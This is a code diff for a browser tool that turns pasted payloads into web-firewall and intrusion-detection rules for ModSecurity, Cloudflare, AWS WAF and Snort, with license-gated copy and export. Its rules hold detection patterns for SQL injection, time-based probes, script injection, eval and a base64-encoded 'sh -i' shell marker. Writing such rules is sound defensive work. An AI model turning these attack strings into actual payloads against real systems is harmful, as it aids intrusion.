+      const text = document.getElementById('payloadInput').value;
+      updateWafRules(text);
+    }
+
+    function updateWafRules(text, matched = []) {
+      const viewer = document.getElementById('wafCodeViewer');
+      const cleanSnippet = text.slice(0, 40).replace(/["'\\]/g, '');
+
+      let rule = '';
+      if (currentWafPlatform === 'modsec') {
+        rule = '# ModSecurity CRS Rule (Generated by Payload & Entropy Studio)\\n' +
+               'SecRule REQUEST_URI|REQUEST_BODY "@rx (?i)(sleep\\\\(|benchmark\\\\(|base64|union.*select|<script)" \\\\\\n' +
+               '    "id:1009401,\\\\\\n' +
+               '    phase:2,\\\\\\n' +
+               '    deny,\\\\\\n' +
+               '    status:403,\\\\\\n' +
+               '    log,\\\\\\n' +
+               '    msg:\'Sovereign Threat Sentinel: High Entropy Malicious Vector Blocked\',\\\\\\n' +
+               '    tag:\'OWASP_CRS\',\\\\\\n' +
+               '    severity:\'CRITICAL\'"';
+      } else if (currentWafPlatform === 'cloudflare') {
+        rule = '# Cloudflare WAF Custom Expression\\n' +
+               '(http.request.uri.path matches "(?i)(union.*select|sleep\\\\(|eval\\\\()" or\\n' +
+               ' http.request.body.raw matches "(?i)(c2ggLWkg|base64)" or\\n' +
+               ' cf.threat_score gt 40)\\n' +
+               'Action: Block';
+      } else if (currentWafPlatform === 'awswaf') {
+        rule = `{
+  "Name": "SovereignEntropyThreatRule",
+  "Priority": 1,
+  "Statement": {
+    "ByteMatchStatement": {
+      "SearchString": "${cleanSnippet || 'exploit'}",
+      "FieldToMatch": { "SingleQueryArgument": { "Name": "q" } },
+      "TextTransformations": [{ "Priority": 0, "Type": "URL_DECODE" }],
+      "PositionalConstraint": "CONTAINS"
+    }
+  },
+  "Action": { "Block": {} },
+  "VisibilityConfig": { "SampledRequestsEnabled": true, "CloudWatchMetricsEnabled": true, "MetricName": "SovereignThreat" }
+}`;
+      } else {
+        rule = `# Snort / Suricata Intrusion Detection Signature
+alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (
+    msg:"SOVEREIGN-EXPLOIT High Entropy Obfuscated Attack Vector";
+    flow:to_server,established;
+    content:"${cleanSnippet || 'malicious'}"; nocase;
+    classtype:web-application-attack;
+    sid:9001402; rev:1;
+)`;
+      }
+
+      viewer.textContent = rule;
     }
 
     function copyWafRule() {
-      const code = currentWafRules[activeWaf] || '';
-      navigator.clipboard.writeText(code);
-      alert(`Copied ${activeWaf.toUpperCase()} rule to clipboard!`);
+      if (!isProLicensed) {
+        openLicenseModal();
+        return;
+      }
+      const code = document.getElementById('wafCodeViewer').textContent;
+      navigator.clipboard.writeText(code).then(() => {
+        alert('Copied WAF rule to clipboard!');
+      });
+    }
+
+    function exportThreatBundle() {
+      if (!isProLicensed) {
+        openLicenseModal();
+        return;
+      }
+      const text = document.getElementById('payloadInput').value;
+      const blob = new Blob([JSON.stringify({
+        tool: "payload-entropy-studio",
+        version: "2.4.0",
+        timestamp: new Date().toISOString(),
+        entropy_shannon: document.getElementById('valShannon').textContent,
+        kolmogorov: document.getElementById('valKolmogorov').textContent,
+        payload_length: text.length,
+        waf_rule: document.getElementById('wafCodeViewer').textContent
+      }, null, 2)], { type: 'application/json' });
+
+      const a = document.createElement('a');
+      a.href = URL.createObjectURL(blob);
+      a.download = `threat-dossier-${Date.now()}.json`;
+      a.click();
     }
 
     function escapeHtml(str) {
       if (!str) return '';
-      return String(str)
-        .replace(/&/g, '&amp;')
-        .replace(/</g, '&lt;')
-        .replace(/>/g, '&gt;')
-        .replace(/"/g, '&quot;');
+      return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
     }
 
-    runFullAnalysis();
+    // --- Init ---
+    window.addEventListener('DOMContentLoaded', () => {
+      checkLicense();
+      loadPreset('sql');
+    });
   </script>
 </body>
 </html>
